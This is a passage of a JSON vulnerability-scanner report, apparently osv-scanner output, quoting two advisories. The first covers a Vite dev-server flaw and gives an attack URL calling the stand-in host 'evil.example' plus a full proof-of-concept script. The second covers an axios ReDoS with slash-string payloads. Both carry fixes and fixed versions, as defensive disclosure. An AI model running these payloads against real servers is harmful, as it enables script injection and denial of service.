              "help": {
                "text": "**Your dependency is vulnerable to [CVE-2026-112945](https://osv.dev/list?q=CVE-2026-112945)**.\n\n## [GHSA-9jrq-w75r-8gcw](https://osv.dev/vulnerability/GHSA-9jrq-w75r-8gcw)\n\n\u003cdetails\u003e\n\u003csummary\u003eDetails\u003c/summary\u003e\n\n\u003e ### Summary\n\u003e \n\u003e When accessing a malicious site while a dev server using Vite is running, that site was able to load scripts in a page served by the dev server.\n\u003e \n\u003e ### Impact\n\u003e \n\u003e Only apps that match the following conditions are affected:\n\u003e \n\u003e - the dev server passes an unchanged browser request URL to `server.transformIndexHtml`: this is normally used for `server.middlewareMode: true` or `appType: 'custom'`. The internal call for `appType: 'spa'` and `appType: 'mpa'` does not match this.\n\u003e - the transformed HTML contains an inline module script\n\u003e - from the script in the page served by the dev server, the app stores sensitive values in the location accessible or allows critical actions\n\u003e \n\u003e ### Details\n\u003e \n\u003e [Vite's SSR guide for 8.2.1](https://github.com/vitejs/vite/blob/421615865dad3ed39137d17281814fc78a41246c/docs/guide/ssr.md#L119-L131) documents the affected setup. The application embeds Vite in middleware mode, reads trusted HTML, and passes the browser's unchanged request URL to the transform:\n\u003e \n\u003e ```js\n\u003e const url = req.originalUrl\n\u003e template = await vite.transformIndexHtml(url, template)\n\u003e ```\n\u003e \n\u003e For a development server at `http://localhost:5173`, an attacker can send this URL:\n\u003e \n\u003e ```text\n\u003e http://localhost:5173//evil.example/payload.js?/../../package.json\n\u003e ```\n\u003e \n\u003e In Vite 8.2.1, [`createDevHtmlTransformFn` and `getHtmlFilename` in `indexHtml.ts`](https://github.com/vitejs/vite/blob/421615865dad3ed39137d17281814fc78a41246c/packages/vite/src/node/server/middlewares/indexHtml.ts#L99-L115) use the request URL as both the transform `path` and the input to `path.join`. The value passed to `path.join` still includes its query text.\n\u003e \n\u003e Chromium preserves `/../../package.json` because it follows `?` and is therefore query text. Vite treats the same characters as filesystem path components, so the `..` components resolve the derived filename to the existing project `package.json`.\n\u003e \n\u003e [The existing file branch in `indexHtml.ts`](https://github.com/vitejs/vite/blob/421615865dad3ed39137d17281814fc78a41246c/packages/vite/src/node/server/middlewares/indexHtml.ts#L216-L232) checks that filename with `fs.existsSync`, then preserves the `htmlPath` supplied by the attacker as `proxyModuleUrl`. [The inline module rewrite in the same file](https://github.com/vitejs/vite/blob/421615865dad3ed39137d17281814fc78a41246c/packages/vite/src/node/server/middlewares/indexHtml.ts#L271-L278) writes that value into the generated `src`:\n\u003e \n\u003e ```html\n\u003e \u003cscript type=\"module\" src=\"//evil.example/payload.js?/../../package.json?html-proxy\u0026index=0.js\"\u003e\u003c/script\u003e\n\u003e ```\n\u003e \n\u003e The generated value is a valid URL. Its leading `//` tells the browser to request the module from `evil.example` using the Vite page's scheme. The attacker returns JavaScript for that request, and Chromium executes it in the Vite page.\n\u003e \n\u003e ### PoC\n\u003e \n\u003e ```js\n\u003e import { createServer as createHttpServer } from 'node:http'\n\u003e import { createRequire } from 'node:module'\n\u003e import { dirname, join } from 'node:path'\n\u003e import { fileURLToPath, pathToFileURL } from 'node:url'\n\u003e \n\u003e const directory = dirname(fileURLToPath(import.meta.url))\n\u003e const require = createRequire(join(directory, 'package.json'))\n\u003e const { chromium } = require('playwright-chromium')\n\u003e const viteModule = await import(\n\u003e   pathToFileURL(require.resolve('vite')).href\n\u003e )\n\u003e const createViteServer =\n\u003e   viteModule.createServer ?? viteModule.default.createServer\n\u003e \n\u003e // This loopback server stands in for a separately hosted attacker website.\n\u003e const attackerPort = 4173\n\u003e const exploitPath = `//127.0.0.1:${attackerPort}/payload.js?/../../package.json`\n\u003e const html = '\u003cscript type=\"module\"\u003edocument.body.textContent = \"Vite app\"\u003c/script\u003e'\n\u003e \n\u003e const listen = (server, port = 0) =\u003e\n\u003e   new Promise((resolve, reject) =\u003e {\n\u003e     server.once('error', reject)\n\u003e     server.listen(port, '127.0.0.1', () =\u003e {\n\u003e       server.off('error', reject)\n\u003e       resolve(server.address().port)\n\u003e     })\n\u003e   })\n\u003e \n\u003e const close = (server) =\u003e\n\u003e   new Promise((resolve, reject) =\u003e {\n\u003e     server.close((error) =\u003e (error ? reject(error) : resolve()))\n\u003e   })\n\u003e \n\u003e let attackerRequest = null\n\u003e const attacker = createHttpServer((request, response) =\u003e {\n\u003e   attackerRequest = request.url\n\u003e   response.writeHead(200, {\n\u003e     'access-control-allow-origin': '*',\n\u003e     'content-type': 'text/javascript',\n\u003e   })\n\u003e   response.end(\n\u003e     \"document.documentElement.dataset.viteXssPoc = 'executed'\",\n\u003e   )\n\u003e })\n\u003e \n\u003e const vite = await createViteServer({\n\u003e   appType: 'custom',\n\u003e   configFile: false,\n\u003e   root: directory,\n\u003e   server: {\n\u003e     hmr: false,\n\u003e     middlewareMode: true,\n\u003e     watch: null,\n\u003e   },\n\u003e })\n\u003e \n\u003e const application = createHttpServer((request, response) =\u003e {\n\u003e   vite.middlewares(request, response, async (error) =\u003e {\n\u003e     if (error) {\n\u003e       response.destroy(error)\n\u003e       return\n\u003e     }\n\u003e \n\u003e     try {\n\u003e       const transformed = await vite.transformIndexHtml(request.url, html)\n\u003e       response.writeHead(200, { 'content-type': 'text/html' })\n\u003e       response.end(transformed)\n\u003e     } catch (transformError) {\n\u003e       response.destroy(transformError)\n\u003e     }\n\u003e   })\n\u003e })\n\u003e \n\u003e await listen(attacker, attackerPort)\n\u003e const applicationPort = await listen(application)\n\u003e const browser = await chromium.launch({ headless: true })\n\u003e \n\u003e try {\n\u003e   const page = await browser.newPage()\n\u003e   await page.goto(`http://127.0.0.1:${applicationPort}${exploitPath}`)\n\u003e   await page.waitForFunction(\n\u003e     () =\u003e document.documentElement.dataset.viteXssPoc === 'executed',\n\u003e   )\n\u003e \n\u003e   console.log(`attacker request: ${attackerRequest}`)\n\u003e   console.log('JavaScript from the attacker server executed in the Vite page')\n\u003e } finally {\n\u003e   await browser.close()\n\u003e   await close(application)\n\u003e   await vite.close()\n\u003e   await close(attacker)\n\u003e }\n\u003e ```\n\u003e \n\u003e Observed output on Vite 8.2.1:\n\u003e ```text\n\u003e attacker request: /payload.js?/../../package.json?html-proxy\u0026index=0.js\n\u003e JavaScript from the attacker server executed in the Vite page\n\u003e ```\n\n\u003c/details\u003e\n\n---\n\n### Affected Packages\n\n| Source | Package Name | Package Version |\n| --- | --- | --- |\n| lockfile:/builds/iw/ai/agent-kit/ironwallet-agent-kit/packages/mcp-server/package-lock.json | vite | 6.4.3 |\n\n## Remediation\n\nTo fix these vulnerabilities, update the vulnerabilities past the listed fixed versions below.\n\n### Fixed Versions\n\n| Vulnerability ID | Package Name | Fixed Version |\n| --- | --- | --- |\n| GHSA-9jrq-w75r-8gcw | vite | 6.4.4, 7.3.7, 8.1.6, 8.2.4, 8.3.3 |\n| GHSA-9jrq-w75r-8gcw | vite-plus | 1.1.0 |\n\nIf you believe these vulnerabilities do not affect your code and wish to ignore them, add them to the ignore list in an\n`osv-scanner.toml` file located in the same directory as the lockfile containing the vulnerable dependency.\n\nSee the format and more options in our documentation here: https://google.github.io/osv-scanner/configuration/\n\nAdd or append these values to the following config files to ignore this vulnerability:\n\n`/builds/iw/ai/agent-kit/ironwallet-agent-kit/packages/mcp-server/osv-scanner.toml`\n\n```\n[[IgnoredVulns]]\nid = \"CVE-2026-112945\"\nreason = \"Your reason for ignoring this vulnerability\"\n```\n",
                "markdown": "**Your dependency is vulnerable to [CVE-2026-112945](https://osv.dev/list?q=CVE-2026-112945)**.\n\n## [GHSA-9jrq-w75r-8gcw](https://osv.dev/vulnerability/GHSA-9jrq-w75r-8gcw)\n\n\u003cdetails\u003e\n\u003csummary\u003eDetails\u003c/summary\u003e\n\n\u003e ### Summary\n\u003e \n\u003e When accessing a malicious site while a dev server using Vite is running, that site was able to load scripts in a page served by the dev server.\n\u003e \n\u003e ### Impact\n\u003e \n\u003e Only apps that match the following conditions are affected:\n\u003e \n\u003e - the dev server passes an unchanged browser request URL to `server.transformIndexHtml`: this is normally used for `server.middlewareMode: true` or `appType: 'custom'`. The internal call for `appType: 'spa'` and `appType: 'mpa'` does not match this.\n\u003e - the transformed HTML contains an inline module script\n\u003e - from the script in the page served by the dev server, the app stores sensitive values in the location accessible or allows critical actions\n\u003e \n\u003e ### Details\n\u003e \n\u003e [Vite's SSR guide for 8.2.1](https://github.com/vitejs/vite/blob/421615865dad3ed39137d17281814fc78a41246c/docs/guide/ssr.md#L119-L131) documents the affected setup. The application embeds Vite in middleware mode, reads trusted HTML, and passes the browser's unchanged request URL to the transform:\n\u003e \n\u003e ```js\n\u003e const url = req.originalUrl\n\u003e template = await vite.transformIndexHtml(url, template)\n\u003e ```\n\u003e \n\u003e For a development server at `http://localhost:5173`, an attacker can send this URL:\n\u003e \n\u003e ```text\n\u003e http://localhost:5173//evil.example/payload.js?/../../package.json\n\u003e ```\n\u003e \n\u003e In Vite 8.2.1, [`createDevHtmlTransformFn` and `getHtmlFilename` in `indexHtml.ts`](https://github.com/vitejs/vite/blob/421615865dad3ed39137d17281814fc78a41246c/packages/vite/src/node/server/middlewares/indexHtml.ts#L99-L115) use the request URL as both the transform `path` and the input to `path.join`. The value passed to `path.join` still includes its query text.\n\u003e \n\u003e Chromium preserves `/../../package.json` because it follows `?` and is therefore query text. Vite treats the same characters as filesystem path components, so the `..` components resolve the derived filename to the existing project `package.json`.\n\u003e \n\u003e [The existing file branch in `indexHtml.ts`](https://github.com/vitejs/vite/blob/421615865dad3ed39137d17281814fc78a41246c/packages/vite/src/node/server/middlewares/indexHtml.ts#L216-L232) checks that filename with `fs.existsSync`, then preserves the `htmlPath` supplied by the attacker as `proxyModuleUrl`. [The inline module rewrite in the same file](https://github.com/vitejs/vite/blob/421615865dad3ed39137d17281814fc78a41246c/packages/vite/src/node/server/middlewares/indexHtml.ts#L271-L278) writes that value into the generated `src`:\n\u003e \n\u003e ```html\n\u003e \u003cscript type=\"module\" src=\"//evil.example/payload.js?/../../package.json?html-proxy\u0026index=0.js\"\u003e\u003c/script\u003e\n\u003e ```\n\u003e \n\u003e The generated value is a valid URL. Its leading `//` tells the browser to request the module from `evil.example` using the Vite page's scheme. The attacker returns JavaScript for that request, and Chromium executes it in the Vite page.\n\u003e \n\u003e ### PoC\n\u003e \n\u003e ```js\n\u003e import { createServer as createHttpServer } from 'node:http'\n\u003e import { createRequire } from 'node:module'\n\u003e import { dirname, join } from 'node:path'\n\u003e import { fileURLToPath, pathToFileURL } from 'node:url'\n\u003e \n\u003e const directory = dirname(fileURLToPath(import.meta.url))\n\u003e const require = createRequire(join(directory, 'package.json'))\n\u003e const { chromium } = require('playwright-chromium')\n\u003e const viteModule = await import(\n\u003e   pathToFileURL(require.resolve('vite')).href\n\u003e )\n\u003e const createViteServer =\n\u003e   viteModule.createServer ?? viteModule.default.createServer\n\u003e \n\u003e // This loopback server stands in for a separately hosted attacker website.\n\u003e const attackerPort = 4173\n\u003e const exploitPath = `//127.0.0.1:${attackerPort}/payload.js?/../../package.json`\n\u003e const html = '\u003cscript type=\"module\"\u003edocument.body.textContent = \"Vite app\"\u003c/script\u003e'\n\u003e \n\u003e const listen = (server, port = 0) =\u003e\n\u003e   new Promise((resolve, reject) =\u003e {\n\u003e     server.once('error', reject)\n\u003e     server.listen(port, '127.0.0.1', () =\u003e {\n\u003e       server.off('error', reject)\n\u003e       resolve(server.address().port)\n\u003e     })\n\u003e   })\n\u003e \n\u003e const close = (server) =\u003e\n\u003e   new Promise((resolve, reject) =\u003e {\n\u003e     server.close((error) =\u003e (error ? reject(error) : resolve()))\n\u003e   })\n\u003e \n\u003e let attackerRequest = null\n\u003e const attacker = createHttpServer((request, response) =\u003e {\n\u003e   attackerRequest = request.url\n\u003e   response.writeHead(200, {\n\u003e     'access-control-allow-origin': '*',\n\u003e     'content-type': 'text/javascript',\n\u003e   })\n\u003e   response.end(\n\u003e     \"document.documentElement.dataset.viteXssPoc = 'executed'\",\n\u003e   )\n\u003e })\n\u003e \n\u003e const vite = await createViteServer({\n\u003e   appType: 'custom',\n\u003e   configFile: false,\n\u003e   root: directory,\n\u003e   server: {\n\u003e     hmr: false,\n\u003e     middlewareMode: true,\n\u003e     watch: null,\n\u003e   },\n\u003e })\n\u003e \n\u003e const application = createHttpServer((request, response) =\u003e {\n\u003e   vite.middlewares(request, response, async (error) =\u003e {\n\u003e     if (error) {\n\u003e       response.destroy(error)\n\u003e       return\n\u003e     }\n\u003e \n\u003e     try {\n\u003e       const transformed = await vite.transformIndexHtml(request.url, html)\n\u003e       response.writeHead(200, { 'content-type': 'text/html' })\n\u003e       response.end(transformed)\n\u003e     } catch (transformError) {\n\u003e       response.destroy(transformError)\n\u003e     }\n\u003e   })\n\u003e })\n\u003e \n\u003e await listen(attacker, attackerPort)\n\u003e const applicationPort = await listen(application)\n\u003e const browser = await chromium.launch({ headless: true })\n\u003e \n\u003e try {\n\u003e   const page = await browser.newPage()\n\u003e   await page.goto(`http://127.0.0.1:${applicationPort}${exploitPath}`)\n\u003e   await page.waitForFunction(\n\u003e     () =\u003e document.documentElement.dataset.viteXssPoc === 'executed',\n\u003e   )\n\u003e \n\u003e   console.log(`attacker request: ${attackerRequest}`)\n\u003e   console.log('JavaScript from the attacker server executed in the Vite page')\n\u003e } finally {\n\u003e   await browser.close()\n\u003e   await close(application)\n\u003e   await vite.close()\n\u003e   await close(attacker)\n\u003e }\n\u003e ```\n\u003e \n\u003e Observed output on Vite 8.2.1:\n\u003e ```text\n\u003e attacker request: /payload.js?/../../package.json?html-proxy\u0026index=0.js\n\u003e JavaScript from the attacker server executed in the Vite page\n\u003e ```\n\n\u003c/details\u003e\n\n---\n\n### Affected Packages\n\n| Source | Package Name | Package Version |\n| --- | --- | --- |\n| lockfile:/builds/iw/ai/agent-kit/ironwallet-agent-kit/packages/mcp-server/package-lock.json | vite | 6.4.3 |\n\n## Remediation\n\nTo fix these vulnerabilities, update the vulnerabilities past the listed fixed versions below.\n\n### Fixed Versions\n\n| Vulnerability ID | Package Name | Fixed Version |\n| --- | --- | --- |\n| GHSA-9jrq-w75r-8gcw | vite | 6.4.4, 7.3.7, 8.1.6, 8.2.4, 8.3.3 |\n| GHSA-9jrq-w75r-8gcw | vite-plus | 1.1.0 |\n\nIf you believe these vulnerabilities do not affect your code and wish to ignore them, add them to the ignore list in an\n`osv-scanner.toml` file located in the same directory as the lockfile containing the vulnerable dependency.\n\nSee the format and more options in our documentation here: https://google.github.io/osv-scanner/configuration/\n\nAdd or append these values to the following config files to ignore this vulnerability:\n\n`/builds/iw/ai/agent-kit/ironwallet-agent-kit/packages/mcp-server/osv-scanner.toml`\n\n```\n[[IgnoredVulns]]\nid = \"CVE-2026-112945\"\nreason = \"Your reason for ignoring this vulnerability\"\n```\n"
              }
            },
            {
              "id": "CVE-2026-101903",
              "name": "CVE-2026-101903",
              "shortDescription": {
                "text": "CVE-2026-101903: Axios: ReDoS in fromDataURI data: URL parser freezes the Node event loop (DoS)"
              },
              "fullDescription": {
                "text": "## Summary\n\nAxios for Node.js parses `data:` URLs in `lib/helpers/fromDataURI.js`. The current RFC-2397 parser uses a regular expression whose media type groups allow `/` inside both sides of the `type/subtype` match. A malformed `data:` URL containing many slashes and no comma forces the JavaScript regex engine to try many possible placements for the separator before failing.\n\nApplications are affected when they pass untrusted URL strings to axios and do not reject or constrain `data:` URLs before axios parses them.\n\n## Impact\n\nAn attacker can make the Node.js event loop spend significant synchronous CPU time parsing a single malformed URL. In a server that accepts a URL from an HTTP request and calls `axios.get(url)`, this can block unrelated requests and health checks until parsing completes.\n\nThe issue is availability-only. It does not disclose data or modify requests.\n\n## Affected Functionality\n\nAffected:\n\n- Node.js HTTP adapter data URL handling.\n- `axios.get()` or equivalent calls where `config.url` has the `data:` protocol.\n\nNot affected:\n\n- Browser fetch/XHR URL handling.\n- Node requests where the application rejects `data:` URLs before calling axios.\n- Older checked `0.x` data URL parser shape unless separately proven vulnerable.\n\n## Technical Details\n\n`lib/helpers/fromDataURI.js` contains:\n\n```js\nconst DATA_URL_PATTERN = /^([^,;]+\\/[^,;]+)?((?:;[^,;=]+=[^,;]+)*)(;base64)?,([\\s\\S]*)$/;\n```\n\nThe `[^,;]+` groups include `/`, so a long string of slashes without a comma can be partitioned around the required `\\/` in many ways before the match fails. The match runs before axios can apply request timeout behavior, so `timeout` does not mitigate the parsing pause.\n\nLocal timing on axios `1.18.1` with small payloads showed about 2.4 ms at 1000 slashes, 16.6 ms at 3000 slashes, and 71.5 ms at 6000 slashes, consistent with the submitted quadratic scaling while avoiding long-running payloads.\n\n## Proof of Concept of Attack\n\nConstrained helper-level demonstration:\n\n```js\nimport axios from 'axios';\n\nawait axios.get('data:' + '/'.repeat(6000));\n```\n\nThe request fails after parsing, but the failure is delayed by synchronous regex work. Larger payloads increase the pause substantially.\n\n## Workarounds\n\nReject `data:` URLs before passing untrusted input to axios, or enforce a strict maximum URL length for URL-fetching endpoints. Applications that do not need `data:` URL support should deny that protocol explicitly.\n\n\u003cdetails\u003e\n  \u003csummary\u003e\u003ch3\u003eOriginal report\u003c/h3\u003e\u003c/summary\u003e\n  \n# ReDoS in `fromDataURI` data: URL parser freezes the event loop (DoS)\n\n## Affected\n- Package: `axios` (Node.js http adapter)\n- Versions: 1.x (regex present on `v1.x`, current release line)\n- File: `lib/helpers/fromDataURI.js`\n- CWE-1333 (Inefficient Regular Expression Complexity)\n\n## Issue\n`fromDataURI` parses `data:` URLs with this regex:\n\n```js\n// lib/helpers/fromDataURI.js:9\nconst DATA_URL_PATTERN = /^([^,;]+\\/[^,;]+)?((?:;[^,;=]+=[^,;]+)*)(;base64)?,([\\s\\S]*)$/;\n```\n\nThe mediatype tokens `[^,;]+` include `/`, so they can span multiple slashes ambiguously. A `data:` URL made of many slashes with no comma forces the engine to try every way to place the single `\\/` divider before failing — quadratic O(n²) backtracking. It runs synchronously on the main thread, so the whole Node event loop is frozen for the entire parse. Reachable through the public API on the Node http adapter (`axios.get(url)`); the browser fetch/xhr adapters are not affected because they do not call `fromDataURI`.\n\nA configured `timeout` does not help: the freeze happens during parsing, before any network timer can fire.\n\n## PoC (minimal)\n```js\nimport axios from 'axios';\n// ~256 KB data: URL of pure slashes, no comma\nawait axios.get('data:' + '/'.repeat(262139)); // blocks the event loop ~6 min, then throws\n```\n\n## Lab results\nSingle-threaded \"fetch a user-supplied URL\" service (link-preview style) calling `axios.get` on a JSON body `{ \"url\": \"...\" }`, with `timeout: 1000` set.\n\nScaling is clean O(n²) (constant k ≈ 5.6e-6 ms/byte², stable across sizes):\n\n| data: URL size | Event-loop freeze (one request) |\n| --- | --- |\n| 32 KB | 6.3 s (measured end-to-end; server logged `event loop BLOCKED for 6.30s`) |\n| 64 KB | ~24 s |\n| 128 KB | ~96 s |\n| 256 KB | ~385 s (~6.4 min) |\n| 1 MB | ~100 min |\n\nDuring the freeze the server answers nothing: a `/healthz` liveness probe times out for the whole window, and the server's own event-loop monitor cannot even log until the parse finishes. In a run through an intercepting proxy, the proxy hit its 120 s upstream timeout and gave up, while the origin stayed pegged at 100% CPU on one core past that — client/proxy timeouts do not mitigate it.\n\nThe attacker controls only the URL string and needs no auth. ~256 KB every ~6 min (≈ 0.7 bytes/sec) keeps a server permanently unavailable.\n\n## Impact\nUnauthenticated remote denial of service. One small request takes a Node service fully offline for minutes; a trickle keeps it down indefinitely.\nCVSS 3.1: 7.5 (High) — `AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H`.\n\n## Fix\nRFC 2045 type/subtype tokens never contain `/`. Excluding `/` from those two character classes removes the ambiguity and the backtracking:\n\n```js\nconst DATA_URL_PATTERN = /^([^,;/]+\\/[^,;/]+)?((?:;[^,;=]+=[^,;]+)*)(;base64)?,([\\s\\S]*)$/;\n```\n\nWorst-case parse drops from ~2600 ms to ~0.002 ms. All valid `data:` URLs, including slashes in the body, parse identically.\n\u003c/details\u003e\n\n---",
                "markdown": "## Summary\n\nAxios for Node.js parses `data:` URLs in `lib/helpers/fromDataURI.js`. The current RFC-2397 parser uses a regular expression whose media type groups allow `/` inside both sides of the `type/subtype` match. A malformed `data:` URL containing many slashes and no comma forces the JavaScript regex engine to try many possible placements for the separator before failing.\n\nApplications are affected when they pass untrusted URL strings to axios and do not reject or constrain `data:` URLs before axios parses them.\n\n## Impact\n\nAn attacker can make the Node.js event loop spend significant synchronous CPU time parsing a single malformed URL. In a server that accepts a URL from an HTTP request and calls `axios.get(url)`, this can block unrelated requests and health checks until parsing completes.\n\nThe issue is availability-only. It does not disclose data or modify requests.\n\n## Affected Functionality\n\nAffected:\n\n- Node.js HTTP adapter data URL handling.\n- `axios.get()` or equivalent calls where `config.url` has the `data:` protocol.\n\nNot affected:\n\n- Browser fetch/XHR URL handling.\n- Node requests where the application rejects `data:` URLs before calling axios.\n- Older checked `0.x` data URL parser shape unless separately proven vulnerable.\n\n## Technical Details\n\n`lib/helpers/fromDataURI.js` contains:\n\n```js\nconst DATA_URL_PATTERN = /^([^,;]+\\/[^,;]+)?((?:;[^,;=]+=[^,;]+)*)(;base64)?,([\\s\\S]*)$/;\n```\n\nThe `[^,;]+` groups include `/`, so a long string of slashes without a comma can be partitioned around the required `\\/` in many ways before the match fails. The match runs before axios can apply request timeout behavior, so `timeout` does not mitigate the parsing pause.\n\nLocal timing on axios `1.18.1` with small payloads showed about 2.4 ms at 1000 slashes, 16.6 ms at 3000 slashes, and 71.5 ms at 6000 slashes, consistent with the submitted quadratic scaling while avoiding long-running payloads.\n\n## Proof of Concept of Attack\n\nConstrained helper-level demonstration:\n\n```js\nimport axios from 'axios';\n\nawait axios.get('data:' + '/'.repeat(6000));\n```\n\nThe request fails after parsing, but the failure is delayed by synchronous regex work. Larger payloads increase the pause substantially.\n\n## Workarounds\n\nReject `data:` URLs before passing untrusted input to axios, or enforce a strict maximum URL length for URL-fetching endpoints. Applications that do not need `data:` URL support should deny that protocol explicitly.\n\n\u003cdetails\u003e\n  \u003csummary\u003e\u003ch3\u003eOriginal report\u003c/h3\u003e\u003c/summary\u003e\n  \n# ReDoS in `fromDataURI` data: URL parser freezes the event loop (DoS)\n\n## Affected\n- Package: `axios` (Node.js http adapter)\n- Versions: 1.x (regex present on `v1.x`, current release line)\n- File: `lib/helpers/fromDataURI.js`\n- CWE-1333 (Inefficient Regular Expression Complexity)\n\n## Issue\n`fromDataURI` parses `data:` URLs with this regex:\n\n```js\n// lib/helpers/fromDataURI.js:9\nconst DATA_URL_PATTERN = /^([^,;]+\\/[^,;]+)?((?:;[^,;=]+=[^,;]+)*)(;base64)?,([\\s\\S]*)$/;\n```\n\nThe mediatype tokens `[^,;]+` include `/`, so they can span multiple slashes ambiguously. A `data:` URL made of many slashes with no comma forces the engine to try every way to place the single `\\/` divider before failing — quadratic O(n²) backtracking. It runs synchronously on the main thread, so the whole Node event loop is frozen for the entire parse. Reachable through the public API on the Node http adapter (`axios.get(url)`); the browser fetch/xhr adapters are not affected because they do not call `fromDataURI`.\n\nA configured `timeout` does not help: the freeze happens during parsing, before any network timer can fire.\n\n## PoC (minimal)\n```js\nimport axios from 'axios';\n// ~256 KB data: URL of pure slashes, no comma\nawait axios.get('data:' + '/'.repeat(262139)); // blocks the event loop ~6 min, then throws\n```\n\n## Lab results\nSingle-threaded \"fetch a user-supplied URL\" service (link-preview style) calling `axios.get` on a JSON body `{ \"url\": \"...\" }`, with `timeout: 1000` set.\n\nScaling is clean O(n²) (constant k ≈ 5.6e-6 ms/byte², stable across sizes):\n\n| data: URL size | Event-loop freeze (one request) |\n| --- | --- |\n| 32 KB | 6.3 s (measured end-to-end; server logged `event loop BLOCKED for 6.30s`) |\n| 64 KB | ~24 s |\n| 128 KB | ~96 s |\n| 256 KB | ~385 s (~6.4 min) |\n| 1 MB | ~100 min |\n\nDuring the freeze the server answers nothing: a `/healthz` liveness probe times out for the whole window, and the server's own event-loop monitor cannot even log until the parse finishes. In a run through an intercepting proxy, the proxy hit its 120 s upstream timeout and gave up, while the origin stayed pegged at 100% CPU on one core past that — client/proxy timeouts do not mitigate it.\n\nThe attacker controls only the URL string and needs no auth. ~256 KB every ~6 min (≈ 0.7 bytes/sec) keeps a server permanently unavailable.\n\n## Impact\nUnauthenticated remote denial of service. One small request takes a Node service fully offline for minutes; a trickle keeps it down indefinitely.\nCVSS 3.1: 7.5 (High) — `AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H`.\n\n## Fix\nRFC 2045 type/subtype tokens never contain `/`. Excluding `/` from those two character classes removes the ambiguity and the backtracking:\n\n```js\nconst DATA_URL_PATTERN = /^([^,;/]+\\/[^,;/]+)?((?:;[^,;=]+=[^,;]+)*)(;base64)?,([\\s\\S]*)$/;\n```\n\nWorst-case parse drops from ~2600 ms to ~0.002 ms. All valid `data:` URLs, including slashes in the body, parse identically.\n\u003c/details\u003e\n\n---"
              },
